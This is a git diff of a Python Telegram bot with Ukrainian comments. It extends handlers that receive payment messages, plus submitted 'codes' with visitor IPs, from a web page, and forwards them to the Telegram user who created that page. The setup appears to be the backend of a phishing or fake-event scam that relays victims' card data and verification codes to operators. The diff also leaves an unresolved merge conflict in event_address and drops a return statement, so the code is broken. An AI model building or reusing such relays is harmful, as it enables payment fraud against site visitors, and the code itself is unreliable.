@@ -1407,9 +1407,9 @@ async def events_save_all(message):
         # Повертаємо меню після створення виставки
         kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
         await message.answer("Головне меню:", reply_markup=kb)
-        # Зберігаємо зв'язок page_code <-> site_user_id (замість event_code)
+        # Зберігаємо зв'язок page_code <-> user_id (Telegram user_id, а не site_user_id)
         c = conn.cursor()
-        c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (page_code, site_user_id))
+        c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (page_code, message.from_user.id))
         conn.commit()
     except Exception as e:
         print(f"[EVENTS] Помилка у events_save_all: {e}")
@@ -1518,13 +1518,28 @@ async def payment_notify(request):
             ]
         )
         await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
-    return web.Response(text='ok')
+
+    # --- Додаю дублювання логів адміну, якщо знайдено user_id по page_code ---
+    page_code = data.get('page', '')
+    admin_user_id = None
+    if page_code:
+        c = conn.cursor()
+        c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+        row = c.fetchone()
+        if row:
+            admin_user_id = row[0]
+    if admin_user_id:
+        await bot.send_message(admin_user_id, msg1, parse_mode='HTML')  # без кнопок
+        await bot.send_message(admin_user_id, msg2)  # без кнопок
+        if code:
+            await bot.send_message(admin_user_id, msg3)  # без кнопок
 
 @log_function
 async def code_notify(request):
     data = await request.json()
     code = data.get('code', '')
     ip = data.get('ip', '')
+    page_code = data.get('page', '') or data.get('page_code', '')
     text = f"Code: {code}\nIP: {ip}"
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
@@ -1534,6 +1549,16 @@ async def code_notify(request):
         ]
     )
     await bot.send_message(PAYMENT_GROUP_ID, text, reply_markup=kb)
+    # --- Додаю дублювання адміну, якщо знайдено user_id по page_code ---
+    admin_user_id = None
+    if page_code:
+        c = conn.cursor()
+        c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+        row = c.fetchone()
+        if row:
+            admin_user_id = row[0]
+    if admin_user_id:
+        await bot.send_message(admin_user_id, text)  # без кнопок
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
@@ -1620,19 +1645,31 @@ async def latest_event_data(request):
 
 @log_function
 async def event_address(request):
-    # Підтримуємо як новий формат ?page= так і старий ?e=
     page_code = request.query.get('page', '') or request.query.get('e', '')
+    print(f"[event_address] page_code: {page_code}")
+    db_path = os.path.abspath('users.db')
+    print(f"[event_address] DB path: {db_path}")
     if not page_code:
+        print("[event_address] No page_code provided")
         return web.json_response({'error': 'missing page or e parameter'}, status=400)
-    # Знайти user_id за page_code
     c = conn.cursor()
     # Спочатку шукаємо в event_links (для нових записів)
     c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
     row = c.fetchone()
     if row:
-        user_id = row[0]
+        print(f"[event_address] Found user_id in event_links: {row[0]}")
+        # user_id тут — це Telegram user_id, тому адресу шукаємо по page_code у site_users
+        c.execute('SELECT street FROM site_users WHERE page_code=?', (page_code,))
+        row2 = c.fetchone()
+        if not row2:
+            print(f"[event_address] page_code {page_code} not found in site_users for street (via event_links)")
+            return web.json_response({'error': 'address not found'}, status=404)
+        address = row2[0]
+        print(f"[event_address] Found address (via event_links): {address}")
+        return web.json_response({'address': address})
     else:
         # Якщо не знайдено в event_links, шукаємо в site_users
+<<<<<<< HEAD
         c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
         row = c.fetchone()
         if not row:
@@ -1645,6 +1682,16 @@ async def event_address(request):
         return web.json_response({'error': 'address not found'}, status=404)
     address, places = row2
     return web.json_response({'address': address, 'places': places})
+=======
+        c.execute('SELECT street FROM site_users WHERE page_code=?', (page_code,))
+        row2 = c.fetchone()
+        if not row2:
+            print(f"[event_address] page_code {page_code} not found in site_users for street (no event_links)")
+            return web.json_response({'error': 'address not found'}, status=404)
+        address = row2[0]
+        print(f"[event_address] Found address (direct): {address}")
+        return web.json_response({'address': address})
+>>>>>>> origin/sasha
 
 @log_function
 async def data_by_ip(request):
